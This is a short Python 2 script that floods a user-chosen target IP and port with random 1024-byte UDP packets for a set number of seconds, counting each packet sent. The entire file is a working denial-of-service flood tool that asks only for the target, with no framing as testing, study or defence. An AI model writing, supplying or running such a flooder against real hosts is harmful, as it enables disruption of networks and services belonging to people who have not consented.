import socket
import random
import time
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # Opens a new socket

bytes = random._urandom(1024) #Creates packet(?)

ip = raw_input("Target IP: ")
port = input('Port:' )
duration = input('Number of secs to send poackets: ' )
timeout = time.time() + duration 
sent = 0

while True:
    if time.time() > timeout:
        break
    else:
        pass
    sock.sendto(bytes, (ip, port) )
    sent = sent + 1
    print "Sent %s packet to %s through port %s" %(sent, ip, port)
    